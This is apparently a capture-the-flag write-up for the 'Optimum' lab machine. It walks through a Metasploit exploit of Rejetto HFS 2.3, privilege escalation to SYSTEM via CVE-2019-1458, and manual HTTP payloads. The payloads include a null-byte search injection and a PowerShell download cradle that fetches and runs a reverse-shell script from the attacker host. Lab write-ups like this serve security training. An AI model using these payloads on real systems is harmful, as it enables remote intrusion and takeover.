## Optimum

__Machine IP: 10.10.10.8__
__Difficulty : Easy__


## Scanning

### Nmap Scanning


```bash
$ nmap -Pn  -sC -sV -oA nmap/optimum 10.10.10.8 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-05 14:07 EDT
Nmap scan report for 10.10.10.8
Host is up (0.097s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.16 seconds
```


- found an exploit for `HttpFileServer httpd 2.3 rejetto`

__Metasploit__

```bash
msf6 > search rejetto

Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/rejetto_hfs_exec

msf6 > use 0
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/http/rejetto_hfs_exec) > set payload windows/x64/meterepreter/reverse_tcp
[-] The value specified for payload is not valid.
msf6 exploit(windows/http/rejetto_hfs_exec) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/http/rejetto_hfs_exec) > set lhost tun2
lhost => tun2
msf6 exploit(windows/http/rejetto_hfs_exec) > set rhosts 10.10.10.8
rhosts => 10.10.10.8
msf6 exploit(windows/http/rejetto_hfs_exec) > show options

Module options (exploit/windows/http/rejetto_hfs_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   HTTPDELAY  10               no        Seconds to wait before terminating web server
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.10.10.8       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The path of the web application
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     tun2             yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(windows/http/rejetto_hfs_exec) > run

[-] Exploit failed: undefined method `values' for nil:NilClass
[*] Exploit completed, but no session was created.
msf6 exploit(windows/http/rejetto_hfs_exec) > run

[*] Started reverse TCP handler on 10.10.14.12:4444 
[*] Using URL: http://0.0.0.0:8080/dAB3qvlu
[*] Local IP: http://192.168.37.128:8080/dAB3qvlu
[*] Server started.
[*] Sending a malicious request to /
/usr/share/metasploit-framework/modules/exploits/windows/http/rejetto_hfs_exec.rb:110: warning: URI.escape is obsolete
/usr/share/metasploit-framework/modules/exploits/windows/http/rejetto_hfs_exec.rb:110: warning: URI.escape is obsolete
[*] Payload request received: /dAB3qvlu
[*] Sending stage (200262 bytes) to 10.10.10.8
[*] Meterpreter session 4 opened (10.10.14.12:4444 -> 10.10.10.8:49162) at 2021-09-06 02:51:19 -0400
[*] Server stopped.
[!] This exploit may require manual cleanup of '%TEMP%\EynYRZulhLbZJF.vbs' on the target

meterpreter > 
```

## Escalation

```bash
msf6 exploit(windows/http/rejetto_hfs_exec) > search suggester

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester


Interact with a module by name or index. For example info 0, use 0 or use post/multi/recon/local_exploit_suggester

msf6 exploit(windows/http/rejetto_hfs_exec) > use 0
msf6 post(multi/recon/local_exploit_suggester) > set session 1
session => 1
msf6 post(multi/recon/local_exploit_suggester) > set session 4
session => 4
msf6 post(multi/recon/local_exploit_suggester) > run

[*] 10.10.10.8 - Collecting local exploits for x64/windows...
[*] 10.10.10.8 - 24 exploit checks are being tried...
[+] 10.10.10.8 - exploit/windows/local/bypassuac_dotnet_profiler: The target appears to be vulnerable.
[+] 10.10.10.8 - exploit/windows/local/bypassuac_sdclt: The target appears to be vulnerable.
[+] 10.10.10.8 - exploit/windows/local/cve_2019_1458_wizardopium: The target appears to be vulnerable.
[-] 10.10.10.8 - Post interrupted by the console user
[*] Post module execution completed
msf6 post(multi/recon/local_exploit_suggester) > 
```


```bash
msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/cve_2019_1458_wizardopium
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/local/cve_2019_1458_wizardopium) > show options

Module options (exploit/windows/local/cve_2019_1458_wizardopium):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   PROCESS  notepad.exe      yes       Name of process to spawn and inject dll into.
   SESSION  1                yes       The session to run this module on.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     tun2             yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 x64


msf6 exploit(windows/local/cve_2019_1458_wizardopium) > sessions -l

Active sessions
===============

  Id  Name  Type                     Information               Connection
  --  ----  ----                     -----------               ----------
  4         meterpreter x64/windows  OPTIMUM\kostas @ OPTIMUM  10.10.14.12:4444 -> 10.10.10.8:49162 (10.10.10.8)

msf6 exploit(windows/local/cve_2019_1458_wizardopium) > set session 4
session => 4
msf6 exploit(windows/local/cve_2019_1458_wizardopium) > run

[*] Started reverse TCP handler on 10.10.14.12:4444 
[*] Executing automatic check (disable AutoCheck to override)
[+] The target appears to be vulnerable.
[*] Launching notepad.exe to host the exploit...
[+] Process 2176 launched.
[*] Injecting exploit into 2176 ...
[*] Exploit injected. Injecting payload into 2176...
[*] Payload injected. Executing exploit...
[*] Sending stage (200262 bytes) to 10.10.10.8
[*] Meterpreter session 5 opened (10.10.14.12:4444 -> 10.10.10.8:49163) at 2021-09-06 03:29:09 -0400

meterpreter > 
meterpreter > shell
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\kostas\Desktop>whoami
whoami
nt authority\system
```


## Manual Exploitation

__Vulnerability Description__
Rejetto HttpFileServer (HFS) is vulnerable to remote command execution attack due to a poor regex in the file ParserLib.pas. This module exploits the HFS scripting commands by using '%00' to bypass the filtering. This module has been tested successfully on HFS 2.3b over Windows XP SP3, Windows 7 SP1 and Windows 8.

- testing with ping.
- `rejetto` commands can be found on `HFS: scripting commands` [rejetto commands wiki](https://www.rejetto.com/wiki/index.php/HFS:_scripting_commands)

- For executing
__`exec | A`__
ask system to run file A, eventually with parameters. If you need to use the pipe, then use macro quoting.
Optional parameter out will let you capture the console output of the program in the variable specified by name.
Optional parameter timeout will specify the max number of seconds the app should be left running.
Example: {.exec|notepad.}


__Result__
- payload
```html
GET /?search=hi%00{.ping+10.10.14.12} HTTP/1.1
Host: 10.10.10.8
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://10.10.10.8/
Cookie: HFS_SID=0.0326641160063446
Upgrade-Insecure-Requests: 1

```

![ping](images/ping.PNG)

- correct output

```bash
04:45:05.679357 IP 10.10.10.8 > 10.10.14.12: ICMP echo request, id 1, seq 7, length 40
04:45:05.679387 IP 10.10.14.12 > 10.10.10.8: ICMP echo reply, id 1, seq 7, length 40
04:45:05.679400 IP 10.10.10.8 > 10.10.14.12: ICMP echo request, id 1, seq 8, length 40
04:45:05.679404 IP 10.10.14.12 > 10.10.10.8: ICMP echo reply, id 1, seq 8, length 40
04:45:06.690718 IP 10.10.10.8 > 10.10.14.12: ICMP echo request, id 1, seq 9, length 40
04:45:06.690794 IP 10.10.14.12 > 10.10.10.8: ICMP 
```



__Executing shellcode__

- Testing `ping` with powershell
```html
GET /?search=hi%00{.exec | c:Windows\SysNative\WindowsPowershell\v1.0\powershell.exe ping 10.10.14.12 .} HTTP/1.1
Host: 10.10.10.8
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://10.10.10.8/
Cookie: HFS_SID=0.0326641160063446
Upgrade-Insecure-Requests: 1
```

 and it worked.. now download the script into the target machine

- setup the listener and send the request
- request + payload

```javascript
GET /?search=%00{.exec |c:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadString('http://10.10.14.12:8000/Invoke-PowerShellTcp.ps1')  .} HTTP/1.1
Host: 10.10.10.8
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://10.10.10.8/
Cookie: HFS_SID=0.0326641160063446
Upgrade-Insecure-Requests: 1
```

> make sure to invoke the script with in the script file with IP and port


__Result__

```bash
$ nc -lvnp  9001                                                                           130 ⨯
listening on [any] 9001 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.10.8] 49162
Windows PowerShell running as user kostas on OPTIMUM
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Users\kostas\Desktop>whoami
optimum\kostas
PS C:\Users\kostas\Desktop> 

```

